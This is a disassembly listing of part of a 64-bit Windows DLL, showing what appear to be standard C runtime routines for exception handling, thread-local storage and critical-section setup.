   1800023b9:	cc                   	int3
   1800023ba:	cc                   	int3
   1800023bb:	cc                   	int3
   1800023bc:	cc                   	int3
   1800023bd:	cc                   	int3
   1800023be:	cc                   	int3
   1800023bf:	cc                   	int3
   1800023c0:	4c 63 0a             	movslq (%rdx),%r9
   1800023c3:	48 63 42 04          	movslq 0x4(%rdx),%rax
   1800023c7:	4c 03 c9             	add    %rcx,%r9
   1800023ca:	85 c0                	test   %eax,%eax
   1800023cc:	78 16                	js     0x1800023e4
   1800023ce:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   1800023d2:	4c 8b c0             	mov    %rax,%r8
   1800023d5:	48 8b 04 08          	mov    (%rax,%rcx,1),%rax
   1800023d9:	48 63 04 02          	movslq (%rdx,%rax,1),%rax
   1800023dd:	49 03 c0             	add    %r8,%rax
   1800023e0:	49 03 c1             	add    %r9,%rax
   1800023e3:	c3                   	ret
   1800023e4:	49 8b c1             	mov    %r9,%rax
   1800023e7:	c3                   	ret
   1800023e8:	cc                   	int3
   1800023e9:	cc                   	int3
   1800023ea:	cc                   	int3
   1800023eb:	cc                   	int3
   1800023ec:	cc                   	int3
   1800023ed:	cc                   	int3
   1800023ee:	cc                   	int3
   1800023ef:	cc                   	int3
   1800023f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800023f5:	57                   	push   %rdi
   1800023f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800023fa:	48 8b 39             	mov    (%rcx),%rdi
   1800023fd:	48 8b d9             	mov    %rcx,%rbx
   180002400:	8b 07                	mov    (%rdi),%eax
   180002402:	3d 52 43 43 e0       	cmp    $0xe0434352,%eax
   180002407:	74 10                	je     0x180002419
   180002409:	3d 4d 4f 43 e0       	cmp    $0xe0434f4d,%eax
   18000240e:	74 09                	je     0x180002419
   180002410:	3d 63 73 6d e0       	cmp    $0xe06d7363,%eax
   180002415:	74 22                	je     0x180002439
   180002417:	eb 13                	jmp    0x18000242c
   180002419:	e8 82 01 00 00       	call   0x1800025a0
   18000241e:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   180002422:	7e 08                	jle    0x18000242c
   180002424:	e8 77 01 00 00       	call   0x1800025a0
   180002429:	ff 48 30             	decl   0x30(%rax)
   18000242c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002431:	33 c0                	xor    %eax,%eax
   180002433:	48 83 c4 20          	add    $0x20,%rsp
   180002437:	5f                   	pop    %rdi
   180002438:	c3                   	ret
   180002439:	e8 62 01 00 00       	call   0x1800025a0
   18000243e:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180002442:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   180002446:	e8 55 01 00 00       	call   0x1800025a0
   18000244b:	48 89 58 28          	mov    %rbx,0x28(%rax)
   18000244f:	e8 5c 35 00 00       	call   0x1800059b0
   180002454:	cc                   	int3
   180002455:	cc                   	int3
   180002456:	cc                   	int3
   180002457:	cc                   	int3
   180002458:	cc                   	int3
   180002459:	cc                   	int3
   18000245a:	cc                   	int3
   18000245b:	cc                   	int3
   18000245c:	cc                   	int3
   18000245d:	cc                   	int3
   18000245e:	cc                   	int3
   18000245f:	cc                   	int3
   180002460:	48 83 ec 28          	sub    $0x28,%rsp
   180002464:	e8 47 35 00 00       	call   0x1800059b0
   180002469:	cc                   	int3
   18000246a:	cc                   	int3
   18000246b:	cc                   	int3
   18000246c:	cc                   	int3
   18000246d:	cc                   	int3
   18000246e:	cc                   	int3
   18000246f:	cc                   	int3
   180002470:	cc                   	int3
   180002471:	cc                   	int3
   180002472:	cc                   	int3
   180002473:	cc                   	int3
   180002474:	cc                   	int3
   180002475:	cc                   	int3
   180002476:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000247d:	00 00 00 
   180002480:	cc                   	int3
   180002481:	cc                   	int3
   180002482:	cc                   	int3
   180002483:	cc                   	int3
   180002484:	cc                   	int3
   180002485:	cc                   	int3
   180002486:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000248d:	00 00 00 
   180002490:	cc                   	int3
   180002491:	cc                   	int3
   180002492:	cc                   	int3
   180002493:	cc                   	int3
   180002494:	cc                   	int3
   180002495:	cc                   	int3
   180002496:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000249d:	00 00 00 
   1800024a0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800024a5:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   1800024aa:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   1800024af:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   1800024b6:	e9 05 00 00 00       	jmp    0x1800024c0
   1800024bb:	cc                   	int3
   1800024bc:	cc                   	int3
   1800024bd:	cc                   	int3
   1800024be:	cc                   	int3
   1800024bf:	cc                   	int3
   1800024c0:	c3                   	ret
   1800024c1:	cc                   	int3
   1800024c2:	cc                   	int3
   1800024c3:	cc                   	int3
   1800024c4:	cc                   	int3
   1800024c5:	cc                   	int3
   1800024c6:	cc                   	int3
   1800024c7:	cc                   	int3
   1800024c8:	cc                   	int3
   1800024c9:	cc                   	int3
   1800024ca:	cc                   	int3
   1800024cb:	cc                   	int3
   1800024cc:	cc                   	int3
   1800024cd:	cc                   	int3
   1800024ce:	cc                   	int3
   1800024cf:	cc                   	int3
   1800024d0:	c3                   	ret
   1800024d1:	cc                   	int3
   1800024d2:	cc                   	int3
   1800024d3:	cc                   	int3
   1800024d4:	cc                   	int3
   1800024d5:	cc                   	int3
   1800024d6:	cc                   	int3
   1800024d7:	cc                   	int3
   1800024d8:	cc                   	int3
   1800024d9:	cc                   	int3
   1800024da:	cc                   	int3
   1800024db:	cc                   	int3
   1800024dc:	cc                   	int3
   1800024dd:	cc                   	int3
   1800024de:	cc                   	int3
   1800024df:	cc                   	int3
   1800024e0:	48 8b 05 61 cd 00 00 	mov    0xcd61(%rip),%rax        # 0x18000f248
   1800024e7:	48 8d 15 d2 f6 ff ff 	lea    -0x92e(%rip),%rdx        # 0x180001bc0
   1800024ee:	48 3b c2             	cmp    %rdx,%rax
   1800024f1:	74 23                	je     0x180002516
   1800024f3:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800024fa:	00 00 
   1800024fc:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   180002503:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   180002507:	72 06                	jb     0x18000250f
   180002509:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   18000250d:	76 07                	jbe    0x180002516
   18000250f:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180002514:	cd 29                	int    $0x29
   180002516:	c3                   	ret
   180002517:	cc                   	int3
   180002518:	cc                   	int3
   180002519:	cc                   	int3
   18000251a:	cc                   	int3
   18000251b:	cc                   	int3
   18000251c:	cc                   	int3
   18000251d:	cc                   	int3
   18000251e:	cc                   	int3
   18000251f:	cc                   	int3
   180002520:	48 85 c9             	test   %rcx,%rcx
   180002523:	74 10                	je     0x180002535
   180002525:	48 8d 05 f4 85 01 00 	lea    0x185f4(%rip),%rax        # 0x18001ab20
   18000252c:	48 3b c8             	cmp    %rax,%rcx
   18000252f:	0f 85 9b 34 00 00    	jne    0x1800059d0
   180002535:	c3                   	ret
   180002536:	cc                   	int3
   180002537:	cc                   	int3
   180002538:	cc                   	int3
   180002539:	cc                   	int3
   18000253a:	cc                   	int3
   18000253b:	cc                   	int3
   18000253c:	cc                   	int3
   18000253d:	cc                   	int3
   18000253e:	cc                   	int3
   18000253f:	cc                   	int3
   180002540:	48 83 ec 28          	sub    $0x28,%rsp
   180002544:	8b 0d 26 7b 01 00    	mov    0x17b26(%rip),%ecx        # 0x18001a070
   18000254a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   18000254d:	74 43                	je     0x180002592
   18000254f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002554:	ff 15 2e cb 00 00    	call   *0xcb2e(%rip)        # 0x18000f088
   18000255a:	8b 0d 10 7b 01 00    	mov    0x17b10(%rip),%ecx        # 0x18001a070
   180002560:	33 d2                	xor    %edx,%edx
   180002562:	48 8b d8             	mov    %rax,%rbx
   180002565:	ff 15 25 cb 00 00    	call   *0xcb25(%rip)        # 0x18000f090
   18000256b:	48 85 db             	test   %rbx,%rbx
   18000256e:	74 1d                	je     0x18000258d
   180002570:	48 8d 05 a9 85 01 00 	lea    0x185a9(%rip),%rax        # 0x18001ab20
   180002577:	48 3b d8             	cmp    %rax,%rbx
   18000257a:	74 11                	je     0x18000258d
   18000257c:	48 8b cb             	mov    %rbx,%rcx
   18000257f:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180002584:	48 83 c4 28          	add    $0x28,%rsp
   180002588:	e9 43 34 00 00       	jmp    0x1800059d0
   18000258d:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   180002592:	48 83 c4 28          	add    $0x28,%rsp
   180002596:	c3                   	ret
   180002597:	cc                   	int3
   180002598:	cc                   	int3
   180002599:	cc                   	int3
   18000259a:	cc                   	int3
   18000259b:	cc                   	int3
   18000259c:	cc                   	int3
   18000259d:	cc                   	int3
   18000259e:	cc                   	int3
   18000259f:	cc                   	int3
   1800025a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800025a5:	57                   	push   %rdi
   1800025a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800025aa:	83 3d bf 7a 01 00 ff 	cmpl   $0xffffffff,0x17abf(%rip)        # 0x18001a070
   1800025b1:	0f 84 b5 00 00 00    	je     0x18000266c
   1800025b7:	ff 15 b3 ca 00 00    	call   *0xcab3(%rip)        # 0x18000f070
   1800025bd:	8b 0d ad 7a 01 00    	mov    0x17aad(%rip),%ecx        # 0x18001a070
   1800025c3:	8b d8                	mov    %eax,%ebx
   1800025c5:	ff 15 bd ca 00 00    	call   *0xcabd(%rip)        # 0x18000f088
   1800025cb:	48 8b f8             	mov    %rax,%rdi
   1800025ce:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800025d2:	0f 84 8c 00 00 00    	je     0x180002664
   1800025d8:	48 85 c0             	test   %rax,%rax
   1800025db:	75 5b                	jne    0x180002638
   1800025dd:	8b 0d 8d 7a 01 00    	mov    0x17a8d(%rip),%ecx        # 0x18001a070
   1800025e3:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   1800025ea:	ff 15 a0 ca 00 00    	call   *0xcaa0(%rip)        # 0x18000f090
   1800025f0:	85 c0                	test   %eax,%eax
   1800025f2:	74 70                	je     0x180002664
   1800025f4:	ba 80 00 00 00       	mov    $0x80,%edx
   1800025f9:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800025fe:	e8 bd 35 00 00       	call   0x180005bc0
   180002603:	8b 0d 67 7a 01 00    	mov    0x17a67(%rip),%ecx        # 0x18001a070
   180002609:	48 8b f8             	mov    %rax,%rdi
   18000260c:	48 85 c0             	test   %rax,%rax
   18000260f:	75 0c                	jne    0x18000261d
   180002611:	33 d2                	xor    %edx,%edx
   180002613:	ff 15 77 ca 00 00    	call   *0xca77(%rip)        # 0x18000f090
   180002619:	33 c9                	xor    %ecx,%ecx
   18000261b:	eb 42                	jmp    0x18000265f
   18000261d:	48 8b d7             	mov    %rdi,%rdx
   180002620:	ff 15 6a ca 00 00    	call   *0xca6a(%rip)        # 0x18000f090
   180002626:	85 c0                	test   %eax,%eax
   180002628:	74 24                	je     0x18000264e
   18000262a:	33 c9                	xor    %ecx,%ecx
   18000262c:	c7 47 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rdi)
   180002633:	e8 98 33 00 00       	call   0x1800059d0
   180002638:	8b cb                	mov    %ebx,%ecx
   18000263a:	ff 15 38 ca 00 00    	call   *0xca38(%rip)        # 0x18000f078
   180002640:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002645:	48 8b c7             	mov    %rdi,%rax
   180002648:	48 83 c4 20          	add    $0x20,%rsp
   18000264c:	5f                   	pop    %rdi
   18000264d:	c3                   	ret
   18000264e:	8b 0d 1c 7a 01 00    	mov    0x17a1c(%rip),%ecx        # 0x18001a070
   180002654:	33 d2                	xor    %edx,%edx
   180002656:	ff 15 34 ca 00 00    	call   *0xca34(%rip)        # 0x18000f090
   18000265c:	48 8b cf             	mov    %rdi,%rcx
   18000265f:	e8 6c 33 00 00       	call   0x1800059d0
   180002664:	8b cb                	mov    %ebx,%ecx
   180002666:	ff 15 0c ca 00 00    	call   *0xca0c(%rip)        # 0x18000f078
   18000266c:	e8 ff 33 00 00       	call   0x180005a70
   180002671:	cc                   	int3
   180002672:	cc                   	int3
   180002673:	cc                   	int3
   180002674:	cc                   	int3
   180002675:	cc                   	int3
   180002676:	cc                   	int3
   180002677:	cc                   	int3
   180002678:	cc                   	int3
   180002679:	cc                   	int3
   18000267a:	cc                   	int3
   18000267b:	cc                   	int3
   18000267c:	cc                   	int3
   18000267d:	cc                   	int3
   18000267e:	cc                   	int3
   18000267f:	cc                   	int3
   180002680:	48 83 ec 28          	sub    $0x28,%rsp
   180002684:	83 3d e5 79 01 00 ff 	cmpl   $0xffffffff,0x179e5(%rip)        # 0x18001a070
   18000268b:	75 07                	jne    0x180002694
   18000268d:	33 c0                	xor    %eax,%eax
   18000268f:	48 83 c4 28          	add    $0x28,%rsp
   180002693:	c3                   	ret
   180002694:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180002699:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000269e:	ff 15 cc c9 00 00    	call   *0xc9cc(%rip)        # 0x18000f070
   1800026a4:	8b 0d c6 79 01 00    	mov    0x179c6(%rip),%ecx        # 0x18001a070
   1800026aa:	8b d8                	mov    %eax,%ebx
   1800026ac:	ff 15 d6 c9 00 00    	call   *0xc9d6(%rip)        # 0x18000f088
   1800026b2:	48 8b f8             	mov    %rax,%rdi
   1800026b5:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800026b9:	74 1c                	je     0x1800026d7
   1800026bb:	48 85 c0             	test   %rax,%rax
   1800026be:	75 77                	jne    0x180002737
   1800026c0:	8b 0d aa 79 01 00    	mov    0x179aa(%rip),%ecx        # 0x18001a070
   1800026c6:	48 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%rdx
   1800026cd:	ff 15 bd c9 00 00    	call   *0xc9bd(%rip)        # 0x18000f090
   1800026d3:	85 c0                	test   %eax,%eax
   1800026d5:	75 04                	jne    0x1800026db
   1800026d7:	33 ff                	xor    %edi,%edi
   1800026d9:	eb 5c                	jmp    0x180002737
   1800026db:	ba 80 00 00 00       	mov    $0x80,%edx
   1800026e0:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   1800026e5:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800026ea:	e8 d1 34 00 00       	call   0x180005bc0
   1800026ef:	8b 0d 7b 79 01 00    	mov    0x1797b(%rip),%ecx        # 0x18001a070
   1800026f5:	48 8b f0             	mov    %rax,%rsi
   1800026f8:	48 85 c0             	test   %rax,%rax
   1800026fb:	74 23                	je     0x180002720
   1800026fd:	48 8b d0             	mov    %rax,%rdx
   180002700:	ff 15 8a c9 00 00    	call   *0xc98a(%rip)        # 0x18000f090
   180002706:	85 c0                	test   %eax,%eax
   180002708:	74 10                	je     0x18000271a
   18000270a:	33 ff                	xor    %edi,%edi
   18000270c:	c7 46 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rsi)
   180002713:	8b cf                	mov    %edi,%ecx
   180002715:	48 8b fe             	mov    %rsi,%rdi
   180002718:	eb 13                	jmp    0x18000272d
   18000271a:	8b 0d 50 79 01 00    	mov    0x17950(%rip),%ecx        # 0x18001a070
   180002720:	33 d2                	xor    %edx,%edx
   180002722:	ff 15 68 c9 00 00    	call   *0xc968(%rip)        # 0x18000f090
   180002728:	48 8b ce             	mov    %rsi,%rcx
   18000272b:	33 ff                	xor    %edi,%edi
   18000272d:	e8 9e 32 00 00       	call   0x1800059d0
   180002732:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002737:	8b cb                	mov    %ebx,%ecx
   180002739:	ff 15 39 c9 00 00    	call   *0xc939(%rip)        # 0x18000f078
   18000273f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002744:	48 8b c7             	mov    %rdi,%rax
   180002747:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   18000274c:	48 83 c4 28          	add    $0x28,%rsp
   180002750:	c3                   	ret
   180002751:	cc                   	int3
   180002752:	cc                   	int3
   180002753:	cc                   	int3
   180002754:	cc                   	int3
   180002755:	cc                   	int3
   180002756:	cc                   	int3
   180002757:	cc                   	int3
   180002758:	cc                   	int3
   180002759:	cc                   	int3
   18000275a:	cc                   	int3
   18000275b:	cc                   	int3
   18000275c:	cc                   	int3
   18000275d:	cc                   	int3
   18000275e:	cc                   	int3
   18000275f:	cc                   	int3
   180002760:	48 83 ec 28          	sub    $0x28,%rsp
   180002764:	48 8d 0d b5 fd ff ff 	lea    -0x24b(%rip),%rcx        # 0x180002520
   18000276b:	ff 15 0f c9 00 00    	call   *0xc90f(%rip)        # 0x18000f080
   180002771:	89 05 f9 78 01 00    	mov    %eax,0x178f9(%rip)        # 0x18001a070
   180002777:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000277a:	74 3f                	je     0x1800027bb
   18000277c:	48 8d 15 9d 83 01 00 	lea    0x1839d(%rip),%rdx        # 0x18001ab20
   180002783:	8b c8                	mov    %eax,%ecx
   180002785:	ff 15 05 c9 00 00    	call   *0xc905(%rip)        # 0x18000f090
   18000278b:	85 c0                	test   %eax,%eax
   18000278d:	74 11                	je     0x1800027a0
   18000278f:	c7 05 ff 83 01 00 fe 	movl   $0xfffffffe,0x183ff(%rip)        # 0x18001ab98
   180002796:	ff ff ff 
   180002799:	b0 01                	mov    $0x1,%al
   18000279b:	48 83 c4 28          	add    $0x28,%rsp
   18000279f:	c3                   	ret
   1800027a0:	8b 0d ca 78 01 00    	mov    0x178ca(%rip),%ecx        # 0x18001a070
   1800027a6:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800027a9:	74 10                	je     0x1800027bb
   1800027ab:	ff 15 e7 c8 00 00    	call   *0xc8e7(%rip)        # 0x18000f098
   1800027b1:	c7 05 b5 78 01 00 ff 	movl   $0xffffffff,0x178b5(%rip)        # 0x18001a070
   1800027b8:	ff ff ff 
   1800027bb:	32 c0                	xor    %al,%al
   1800027bd:	48 83 c4 28          	add    $0x28,%rsp
   1800027c1:	c3                   	ret
   1800027c2:	cc                   	int3
   1800027c3:	cc                   	int3
   1800027c4:	cc                   	int3
   1800027c5:	cc                   	int3
   1800027c6:	cc                   	int3
   1800027c7:	cc                   	int3
   1800027c8:	cc                   	int3
   1800027c9:	cc                   	int3
   1800027ca:	cc                   	int3
   1800027cb:	cc                   	int3
   1800027cc:	cc                   	int3
   1800027cd:	cc                   	int3
   1800027ce:	cc                   	int3
   1800027cf:	cc                   	int3
   1800027d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800027d4:	8b 0d 96 78 01 00    	mov    0x17896(%rip),%ecx        # 0x18001a070
   1800027da:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800027dd:	74 10                	je     0x1800027ef
   1800027df:	ff 15 b3 c8 00 00    	call   *0xc8b3(%rip)        # 0x18000f098
   1800027e5:	c7 05 81 78 01 00 ff 	movl   $0xffffffff,0x17881(%rip)        # 0x18001a070
   1800027ec:	ff ff ff 
   1800027ef:	b0 01                	mov    $0x1,%al
   1800027f1:	48 83 c4 28          	add    $0x28,%rsp
   1800027f5:	c3                   	ret
   1800027f6:	cc                   	int3
   1800027f7:	cc                   	int3
   1800027f8:	cc                   	int3
   1800027f9:	cc                   	int3
   1800027fa:	cc                   	int3
   1800027fb:	cc                   	int3
   1800027fc:	cc                   	int3
   1800027fd:	cc                   	int3
   1800027fe:	cc                   	int3
   1800027ff:	cc                   	int3
   180002800:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002805:	57                   	push   %rdi
   180002806:	48 83 ec 20          	sub    $0x20,%rsp
   18000280a:	33 db                	xor    %ebx,%ebx
   18000280c:	48 8d 3d 8d 83 01 00 	lea    0x1838d(%rip),%rdi        # 0x18001aba0
   180002813:	0f 1f 40 00          	nopl   0x0(%rax)
   180002817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000281e:	00 00 
   180002820:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   180002824:	45 33 c0             	xor    %r8d,%r8d
   180002827:	48 8d 0c cf          	lea    (%rdi,%rcx,8),%rcx
   18000282b:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   180002830:	ff 15 7a c8 00 00    	call   *0xc87a(%rip)        # 0x18000f0b0
   180002836:	85 c0                	test   %eax,%eax
   180002838:	74 1a                	je     0x180002854
   18000283a:	ff 05 88 83 01 00    	incl   0x18388(%rip)        # 0x18001abc8
   180002840:	ff c3                	inc    %ebx
   180002842:	83 fb 01             	cmp    $0x1,%ebx
   180002845:	72 d9                	jb     0x180002820
   180002847:	b0 01                	mov    $0x1,%al
   180002849:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000284e:	48 83 c4 20          	add    $0x20,%rsp
   180002852:	5f                   	pop    %rdi
   180002853:	c3                   	ret
   180002854:	8b 1d 6e 83 01 00    	mov    0x1836e(%rip),%ebx        # 0x18001abc8
   18000285a:	85 db                	test   %ebx,%ebx
   18000285c:	74 1c                	je     0x18000287a
   18000285e:	66 90                	xchg   %ax,%ax
   180002860:	ff cb                	dec    %ebx
   180002862:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   180002866:	48 8d 0c cf          	lea    (%rdi,%rcx,8),%rcx
   18000286a:	ff 15 48 c8 00 00    	call   *0xc848(%rip)        # 0x18000f0b8
   180002870:	ff 0d 52 83 01 00    	decl   0x18352(%rip)        # 0x18001abc8
   180002876:	85 db                	test   %ebx,%ebx
   180002878:	75 e6                	jne    0x180002860
   18000287a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000287f:	32 c0                	xor    %al,%al
   180002881:	48 83 c4 20          	add    $0x20,%rsp
   180002885:	5f                   	pop    %rdi
   180002886:	c3                   	ret
   180002887:	cc                   	int3
   180002888:	cc                   	int3
   180002889:	cc                   	int3
   18000288a:	cc                   	int3
   18000288b:	cc                   	int3
   18000288c:	cc                   	int3
   18000288d:	cc                   	int3
   18000288e:	cc                   	int3
   18000288f:	cc                   	int3
   180002890:	40 53                	rex push %rbx
   180002892:	48 83 ec 20          	sub    $0x20,%rsp
   180002896:	8b 1d 2c 83 01 00    	mov    0x1832c(%rip),%ebx        # 0x18001abc8
   18000289c:	85 db                	test   %ebx,%ebx
   18000289e:	74 2f                	je     0x1800028cf
   1800028a0:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1800028a5:	48 8d 3d f4 82 01 00 	lea    0x182f4(%rip),%rdi        # 0x18001aba0
   1800028ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1800028b0:	ff cb                	dec    %ebx
   1800028b2:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1800028b6:	48 8d 0c cf          	lea    (%rdi,%rcx,8),%rcx
   1800028ba:	ff 15 f8 c7 00 00    	call   *0xc7f8(%rip)        # 0x18000f0b8
   1800028c0:	ff 0d 02 83 01 00    	decl   0x18302(%rip)        # 0x18001abc8
   1800028c6:	85 db                	test   %ebx,%ebx
   1800028c8:	75 e6                	jne    0x1800028b0
   1800028ca:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1800028cf:	b0 01                	mov    $0x1,%al
   1800028d1:	48 83 c4 20          	add    $0x20,%rsp
   1800028d5:	5b                   	pop    %rbx
   1800028d6:	c3                   	ret
   1800028d7:	cc                   	int3
   1800028d8:	cc                   	int3
   1800028d9:	cc                   	int3
   1800028da:	cc                   	int3
   1800028db:	cc                   	int3
   1800028dc:	cc                   	int3
   1800028dd:	cc                   	int3
   1800028de:	cc                   	int3
   1800028df:	cc                   	int3
   1800028e0:	48 8b c4             	mov    %rsp,%rax
   1800028e3:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1800028e7:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800028eb:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1800028ef:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800028f3:	53                   	push   %rbx
   1800028f4:	57                   	push   %rdi
   1800028f5:	48 83 ec 68          	sub    $0x68,%rsp
   1800028f9:	48 8b d9             	mov    %rcx,%rbx
   1800028fc:	33 ff                	xor    %edi,%edi
   1800028fe:	89 78 c8             	mov    %edi,-0x38(%rax)
   180002901:	48 89 48 d8          	mov    %rcx,-0x28(%rax)
   180002905:	4c 89 40 e0          	mov    %r8,-0x20(%rax)
   180002909:	e8 92 fc ff ff       	call   0x1800025a0
   18000290e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180002913:	8b 0b                	mov    (%rbx),%ecx
   180002915:	48 8b 40 10          	mov    0x10(%rax),%rax
   180002919:	ff 15 39 c9 00 00    	call   *0xc939(%rip)        # 0x18000f258
   18000291f:	89 7c 24 40          	mov    %edi,0x40(%rsp)
   180002923:	eb 00                	jmp    0x180002925
   180002925:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180002929:	48 83 c4 68          	add    $0x68,%rsp
   18000292d:	5f                   	pop    %rdi
   18000292e:	5b                   	pop    %rbx
   18000292f:	c3                   	ret
   180002930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002935:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000293a:	57                   	push   %rdi
   18000293b:	48 83 ec 20          	sub    $0x20,%rsp
   18000293f:	48 8b f2             	mov    %rdx,%rsi
   180002942:	48 8b d1             	mov    %rcx,%rdx
   180002945:	48 8b ce             	mov    %rsi,%rcx
   180002948:	e8 93 07 00 00       	call   0x1800030e0
   18000294d:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   180002950:	8b f8                	mov    %eax,%edi
   180002952:	85 db                	test   %ebx,%ebx
   180002954:	74 28                	je     0x18000297e
   180002956:	ff cb                	dec    %ebx
   180002958:	e8 43 fc ff ff       	call   0x1800025a0
   18000295d:	48 8d 14 9b          	lea    (%rbx,%rbx,4),%rdx
   180002961:	48 8b 48 60          	mov    0x60(%rax),%rcx
   180002965:	4c 8d 04 91          	lea    (%rcx,%rdx,4),%r8
   180002969:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   18000296d:	49 03 c8             	add    %r8,%rcx
   180002970:	3b 79 04             	cmp    0x4(%rcx),%edi
   180002973:	7e 05                	jle    0x18000297a
   180002975:	3b 79 08             	cmp    0x8(%rcx),%edi
   180002978:	7e 06                	jle    0x180002980
   18000297a:	85 db                	test   %ebx,%ebx
   18000297c:	75 d8                	jne    0x180002956
   18000297e:	33 c9                	xor    %ecx,%ecx
   180002980:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002985:	48 85 c9             	test   %rcx,%rcx
   180002988:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000298d:	0f 95 c0             	setne  %al
   180002990:	48 83 c4 20          	add    $0x20,%rsp
   180002994:	5f                   	pop    %rdi
   180002995:	c3                   	ret
   180002996:	cc                   	int3
   180002997:	cc                   	int3
   180002998:	cc                   	int3
   180002999:	cc                   	int3
   18000299a:	cc                   	int3
   18000299b:	cc                   	int3
   18000299c:	cc                   	int3
   18000299d:	cc                   	int3
   18000299e:	cc                   	int3
   18000299f:	cc                   	int3
   1800029a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800029a5:	55                   	push   %rbp
   1800029a6:	56                   	push   %rsi
   1800029a7:	57                   	push   %rdi
   1800029a8:	41 56                	push   %r14
   1800029aa:	41 57                	push   %r15
   1800029ac:	48 83 ec 20          	sub    $0x20,%rsp
   1800029b0:	41 8b 78 0c          	mov    0xc(%r8),%edi
   1800029b4:	4c 8b f9             	mov    %rcx,%r15
   1800029b7:	49 8b c8             	mov    %r8,%rcx
   1800029ba:	49 8b f0             	mov    %r8,%rsi
   1800029bd:	4c 8b f2             	mov    %rdx,%r14
   1800029c0:	e8 1b 07 00 00       	call   0x1800030e0
   1800029c5:	4d 8b 0f             	mov    (%r15),%r9
   1800029c8:	8b e8                	mov    %eax,%ebp
   1800029ca:	4c 89 4c 24 50       	mov    %r9,0x50(%rsp)
   1800029cf:	85 ff                	test   %edi,%edi
   1800029d1:	0f 84 8e 00 00 00    	je     0x180002a65
   1800029d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1800029de:	00 00 
   1800029e0:	48 63 46 10          	movslq 0x10(%rsi),%rax
   1800029e4:	ff cf                	dec    %edi
   1800029e6:	48 8d 14 bf          	lea    (%rdi,%rdi,4),%rdx
   1800029ea:	48 8d 1c 90          	lea    (%rax,%rdx,4),%rbx
   1800029ee:	49 03 5e 08          	add    0x8(%r14),%rbx
   1800029f2:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   1800029f5:	7e 53                	jle    0x180002a4a
   1800029f7:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   1800029fa:	7f 4e                	jg     0x180002a4a
   1800029fc:	49 8b 0e             	mov    (%r14),%rcx
   1800029ff:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180002a04:	45 33 c0             	xor    %r8d,%r8d
   180002a07:	ff 15 b3 c6 00 00    	call   *0xc6b3(%rip)        # 0x18000f0c0
   180002a0d:	4c 63 4b 10          	movslq 0x10(%rbx),%r9
